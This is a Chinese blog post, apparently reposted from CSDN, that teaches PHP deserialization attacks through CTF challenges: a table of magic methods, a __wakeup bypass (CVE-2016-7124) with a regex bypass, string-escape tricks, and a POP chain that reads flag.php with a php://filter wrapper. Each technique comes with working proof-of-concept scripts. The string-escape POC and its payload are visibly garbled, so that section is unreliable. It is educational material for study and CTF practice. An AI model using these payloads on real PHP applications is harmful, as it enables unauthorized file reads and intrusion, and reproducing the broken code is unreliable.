> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [blog.csdn.net](https://blog.csdn.net/qq_49422880/article/details/120488517)

序列化和[反序列化](https://so.csdn.net/so/search?q=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&spm=1001.2101.3001.7020)漏洞分析
------------------------------------------------------------------------------------------------------------

  序列化 (serialize) 就将对象的状态信息转换为可以存储或传输的形式的过程 在序列化期间，对象将当前的状态写入到临时或持久性的存储区 【将状态信息保存为字符串】。  
  反序列化 (unserialize) 就是把序列化之后的字符串在转化为对象。  
其实在序列化的过程中是没有任何的漏洞的，产生漏洞的主要的原因就是在反序列化的过程中，通过我们的恶意篡改会产生魔法函数绕过，字符逃逸，远程命令执行等漏洞，最早发现这些漏洞的大佬是真的牛。

### 一、简单的魔法函数

<table><thead><tr><th>魔法函数</th><th>调用的时机</th></tr></thead><tbody><tr><td>__construct()</td><td>初始化类的时候，一般对于变量进行赋值</td></tr><tr><td>__destruct()</td><td>和构造函数相反，在对象不再被使用时 (将所有该对象的引用设为 null) 或者程序退出时自动调用</td></tr><tr><td>__toString()</td><td>当一个对象被当作一个字符串被调用，把类当作字符串使用时触发, 返回值需要为字符串</td></tr><tr><td>__wakeup()</td><td>使用 unserialize 时触发，反序列化恢复对象之前调用该方法</td></tr><tr><td>__sleep()</td><td>使用 serialize 时触发. 该函数需要返回以类成员变量名作为元素的数组 (该数组里的元素会影响类成员变量是否被序列化。只有出现在该数组元素里的类成员变量才会被序列化</td></tr><tr><td>__destruct()</td><td>对象被销毁时触发</td></tr><tr><td>__invoke()</td><td>当脚本尝试将对象调用为函数时触发</td></tr></tbody></table>

PHP 和 C++ 不一样，PHP 是以关键字作为执行的先后，只要有这个函数关键字，就会在反序列化的时候按照一定的调用时机进行调用。

### 二、简单的魔法函数绕过

  这里讲一个十分具有代表性的`__wakeup`魔法函数绕过，这是一个漏洞库里面的漏洞，在讲这个之前我们先看看正常的序列化和反序列化。

```
<?php
class Demo {
    private $file = 'index.php';
    public function __construct($file) {
        $this->file = $file;
    }
    function __destruct() {
        echo @highlight_file($this->file, true);
    }
    function __wakeup() {
        if ($this->file != 'index.php') {
            //the secret is in the fl4g.php
            $this->file = 'index.php';
        }
    }
}

if (isset($_GET['var'])) {
    $var = base64_decode($_GET['var']);
    if (preg_match('/[oc]:\d+:/i', $var)) {
        die('stop hacking!');
    } else {
        @unserialize($var);
    }
} else {
    highlight_file("index.php");
}
?>
```

  分析：对于反序列化漏洞利用我们一般先从拿到 flag 的步骤往回分析至传参入口。然后重点是我们需要关注各个魔法函数，在`__destruct()`函数中可以高亮文件，然而这个 file 是受我们所控制的，也就是说我们可以通过改变 file 的值，获取到我们的 flag。但是我们发现在`__wakeup()`函数中如果不为 index.php 就赋值为 index.php，所以我们需要绕过这个函数。同时我们还需要绕过一个数字的正则匹配，然后将得到的序列化字符串进行 base64 解码。

<table><thead><tr><th>cve 编号</th><th>CVE-2016-7124</th></tr></thead><tbody><tr><td>影响版本</td><td>PHP5 &lt; 5.6.25</td></tr><tr><td>漏洞简述</td><td>当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup 的执行</td></tr></tbody></table>

正常的序列化：

```
//简化后的类，其实就只要留属性就行了
<?php

class Demo {
    private $file = 'fl4g.php'; 
}

$c = serialize(new Demo());

var_dump($c);
echo "<br/>";
var_dump(unserialize($c));

echo "<br/><br/><br/><br/>";
$c = str_replace(':1:',':2:',$c);

var_dump($c);
var_dump(unserialize($c));
?>
```

![](https://img-blog.csdnimg.cn/71e3dd0ab01344408e6da7647502e349.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBATkdDXjIyMzc=,size_20,color_FFFFFF,t_70,g_se,x_16)  
  通过结果我们可以看到修改属性的个数之后，无法反序列化，这就是外面绕过了魔法函数不符合安全原则，系统给我们提示的报错。这当然不影响我们操作。还有一点就是一个正则表达式的绕过。

> `绕过preg_match('/[oc]:\d+:/i', $var)`  
> 我们只要在类的名字长度前加上一个 + 即可。  
> `$c = str_replace('O:4','O:+4'，$c)`

最终的 POC：

```
<?php

class Demo {
    private $file = 'fl4g.php'; 
}
$c = serialize(new Demo());
$c = str_replace(':1:',':2:',$c);
$c = str_replace('O:4','O:+4',$c);
var_dump(base64_encode($c));

?>
```

**最后提交即可。**

### 三、反序列化字符串逃逸

字符串逃逸主要的思路就是在我们序列化之后的字符串会经过一个过滤函数过滤掉我们提交的的类的属性值中的一些关键字，过滤分为两种，一种是过滤之后的字符串增加，另外一种是字符串减少。不管怎么样都能被我们利用进行字符窜逃逸。

1. 字符串增加的情况，这里也是以一道 CTF 题为例 [DASCTF 中北大学 EasyUnser PHP 反序列化字符串逃逸]。  
先看源码：

```
<?php
    include_once 'flag.php';
    highlight_file(__FILE__);
    // Security filtering function
    function filter($str){
        return str_replace('secure', 'secured', $str);
    }
    class Hacker{
        public $username = 'margin';
        public $password = 'margin123';
    }
    $h = new Hacker();
    if (isset($_POST['username']) && isset($_POST['password'])){
        // Security filtering
        $h->username = $_POST['username'];
        $c = unserialize(filter(serialize($h)));
        if ($c->password === 'hacker'){
            echo $flag;
        }
    }
```

  这个就是非常典型的字符串增加的字符串逃逸，我们来分析一下就是如果我们正常的传参那么 password 是不可能变为 hacker 的，那么永远不能产生 flag，这里的利用点就是我们需要通过字符串逃逸，进行序列化和反序列化后改变 password。  
  那么我们如何进行字符传逃逸呢？首先我们知道序列化是对于我们的属性以及它的值进行转化为字符串，拥有固定的格式，那么格式如何呢？以本题我们进行演示：  
![](https://img-blog.csdnimg.cn/be9e38428a6b478caa1d5d19dde7bc91.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBATkdDXjIyMzc=,size_20,color_FFFFFF,t_70,g_se,x_16)  
  这样的话我们进行下一个演示我们尝试在序列化后的字符串后加上一些字符，会产生什么效果，这里会显示反序列化失败，但是在 WEB 服务器上是可以产生反序列化的。  
这里的话因为是经过字符串的增加是可以产生更多的字符，并且我们已经进行序列化，所以在进行字符的替换时会导致我们赋给变量的字符串的数量和我们开始的不一致而产生错误，但是我们需要知道的是，**它在发现数量不一样的时候，会继续往下寻找字符串只到相应的数量，只要往下寻找之后符合数量并且不影响后面属性的反序列化也是可以正常反序列化的**，这也就是我们逃逸的原理。  
  所以一开始我们给的 username 的变量就得包含后面得 password 得结果，然后提前闭合，把后面的 password 挤出去进行逃逸。  
我们构造 password 的正确序列化因该为：

> 因为`";s:8:"password";s:6:"hacker";}` 共有 31 个字符。  
> 所以在序列化之后 username 最好能多出 31 个字符把上面的字符挤下去，于是我们需要多写 31 个 secure 再加上可控的参数，然后用我们构造的字符串提前结束序列化得到可以控制的 password，并且替换后面的 password。

> `userhacker“;}'`

  为什么要怎么构造呢？这里我们需要注意的就是 hacker 后面又 ;}，这个是反序列化的终点，看着这个就会自动识别已经到头了，后面的字符串就不在进行管理，直接丢弃。又因为我们前面的字符串刚好符合反序列化条件，于是乎满天过海，这就出现了字符窜逃逸漏洞。  
完整的 POC【找不到靶场，本地模拟】：

```
<?php

 $flag = 'flag{this_is_test_flag}';
 function filter($str){
        return str_replace('secure', 'secured', $str);
    }

class Hacker{
    public $user;}';
    public $password = 'margin123';
}
$a = new Hacker();

$c = filter(serialize($a));//序列化并且过滤
var_dump($c);//输出过滤后的结果
var_dump(unserialize($c));//测试反序列化是否成功
$d = unserialize($c);//输出反序列化结果

if($d->password==="hacker")
{
    echo $flag;
}
else{
    echo "hacker";
}
?>
```

**拿到本地设置的 flag。**  
![](https://img-blog.csdnimg.cn/2170a640a1d04292b02adf370bb12a07.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBATkdDXjIyMzc=,size_20,color_FFFFFF,t_70,g_se,x_16)  
2. 字符串减少的情况，即过滤掉关键词。  
  这里也是可以绕过的，为什么呢？因为前面的字符串进行置空了之后，后面类的属性名和各种标点符号会顶上，刚好填充之前的值，造成字符串逃逸。有一个非常典型的例子就是安洵杯的序列化和反序列化，这里我后面会直接放出 WP，这里我就直接来说明这个漏洞。  
测试代码，如果我们要拿到 flag，就必须要改变这个 password 的值。

```
<?php
$flag='flag{this_is_test_flag}';
    function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}

class A{
    public $name='index.php';
    public $id='7895645';
    public $password='123456';
}
$a = new A();

$c = serialize($a);
var_dump($c);
echo "<br/><br/>";
$d = filter($c);
var_dump($d);
echo "<br/><br/>";
$F = unserialize($d);
var_dump($F);

if($F->password==='654321')
{
    echo $flag;
}
else {
    echo "YOU are NO XING";
}
```

> 序列化的结果：`O:1:"B":3:{s:4:"name";s:9:"index.php";s:2:"id";s:7:"7895645";s:8:"password";s:6:"123456";}`  
> 如果我们要替换掉 password 的值，就得构造一个`"s:"password";s:6:"654321"`, 这里总共有 26 个字符，所以我们要进行逃逸，利用代码的过滤机制将我们传入的参数进行过滤，然后我们在填充一些垃圾数据进去，使得原来的 ID 的字节 = 垃圾数据 + 后面我们控制的属性数据（一定是符合反序列化规则的）。

  其实怎么填充都可以，只要数值刚好符合反序列规则即可。因为我们需要构造这样的字符串`";s:8:"password";s:6:"654321";}`，所以在 $id 上的末尾一定要加上这个，然后前面的添加规则就是，制空的 name 的变量的长度要等于我们填充的垃圾数据。

**在这里插入图片描述：**  
![](https://img-blog.csdnimg.cn/5fc2235177054b4aa8cb88c6ae22e4f0.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBATkdDXjIyMzc=,size_20,color_FFFFFF,t_70,g_se,x_16)  
**反序列化结果：**  
![](https://img-blog.csdnimg.cn/1563c435feaf4b75883f9e1f9614c05a.png)  
  最终拿到 flag。其实 flag 的数量和我们构造的 ID 的’7895654‘这些都是可控的，也就是说数量不一定是这么多，这种题，大家可以多多调试就可以逃逸出来了。  
![](https://img-blog.csdnimg.cn/a843f06eb9474bb89084dbc5a39e950c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBATkdDXjIyMzc=,size_20,color_FFFFFF,t_70,g_se,x_16)

### 四、POP 链挖掘

  简单的序列化攻击是因为对魔术方法的自动调用而触发漏洞或则通过字符串逃逸，但如果关键代码不在魔术方法，而是在一个类的普通方法中，则需要观察联系类与函数之间的关系，将其与魔术方法的利用结合起来，这时候就可以利用 pop 链的构造与攻击。  
这里我们直接上第一道题【[MRCTF2020]Ezpop】讲解。  
**POC:**

```
<?php 
class Show{
	public $source;
	public $str;
}
class Test{
	public $p;
}
class Modifier{
	protected $var;
	function __construct(){
		$this->var="php://filter/convert.base64-encode/resource=flag.php";
	}
}
$s = new Show();
$t = new Test();
$r = new Modifier();

$s->source = $s;
$s->str = $t;
$t->p = $r;
var_dump(urlencode(serialize($s)));
?>
```

  **下面我们来分析一下，主要就是几个类的相互嵌套和魔法函数触发的条件的观察，一般我的分析是先看获取参数的地方，再看能造成文件包含或则 RCE 的地方，之后再一层一层的分析递推。**

```
<?php
//flag is in flag.php
//WTF IS THIS?
//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95
//And Crack It!
class Modifier {
    protected  $var;
    public function append($value){
        include($value);
    }
    public function __invoke(){
        $this->append($this->var);
    }
}

class Show{
    public $source;
    public $str;
    public function __construct($file='index.php'){
        $this->source = $file;
        echo 'Welcome to '.$this->source."<br>";
    }
    public function __toString(){
        return $this->str->source;
    }

    public function __wakeup(){
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}

class Test{
    public $p;
    public function __construct(){
        $this->p = array();
    }

    public function __get($key){
        $function = $this->p;
        return $function();
    }
}

if(isset($_GET['pop'])){
    @unserialize($_GET['pop']);
}
else{
    $a=new Show;
    highlight_file(__FILE__);
}
```

  通过观察我们可以发现获取参数的地方和 Modifier 类中 incude 的文件包含函数。所以执行到 include 就是我们的最后一步。进一步观察 Modifier 类要执行 append 函数就要执行`__invoke()`函数 **触发条件是: 把类当作函数使用**；  
  既然如此我们继续寻找发现在 Test 类中有一个`return $function()`这就是把对象当函数使用，要执行到这就要执行`__get()`函数 **触发条件获取类的属性的时候**；  
  既然如此我们观察到 Show 中的`return $this->str->source`就使用到了类的属性，要进入到这一步就得触发`__tostring()`函数 {**触犯条件：**，把对象当字符串使用}；然后我们继续看哪里需要把类当作字符串使用，发现在 Show 中`__wakeup()`函数的正则匹配中`$this->source`对象当做字符串使用；  
  然后`__wakeup()`函数的触发就是反序列化的时候调用，完整的分析过程就是这样。

1.  第一步：看到 GET 方式获取通过 pop 获取序列化的参数。
2.  第二步：如果 pop 是个 Show, 那么调用反序列化，会触发`__tosrting()`。
3.  第三步：调用`__toString`，会调用类中的属性，触发`__get()`。
4.  第四步：`__get()`函数中，会把类当作函数，进而触发`__invoke()`。
5.  第五步：`__invoke()`函数中，调用`append()`
6.  第六步：`append()`，直接输出我们的 flag，这个链子就是这样我们只需要对 Modifier 中的 var 使用伪协议读取即可。

  反序列化漏洞利用，差不多就这些内容，主要还是得靠大家实际，才能发现其中得问题所在。